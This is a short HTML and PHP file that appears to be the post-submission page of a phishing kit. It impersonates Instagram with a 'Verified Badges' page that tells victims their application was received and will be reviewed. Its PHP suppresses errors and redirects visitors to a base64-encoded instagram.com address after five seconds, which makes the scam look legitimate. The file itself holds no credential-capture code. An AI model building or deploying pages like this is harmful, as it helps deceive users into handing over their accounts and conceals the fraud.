<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=5, viewport-fit=cover"/>
	<meta charset="utf-8"/>
	<title> Verified Badges • Instagram </title>
	<link rel="shortcut icon"  href="icon.png"/>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
	<center>
<div class="top">
<a href="https://instagram.com"><img id="logo" src="logo.png"></a>
</div>
<div class="confirmed">
<img id="box" src="logo.png">
<br/><br/><br/>
<span id="header">Verified Badges</span>
<br/><br/><br/>
<p id="confirmed">Your application has been successfully received. It will be reviewed within 24 hours and your e-mail address will be returned.</p>
</div>
</center>
</body>
</html>
<?php
error_reporting(0);
$instagram = "aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8=";
header('Refresh:5;url='.base64_decode($instagram));
?>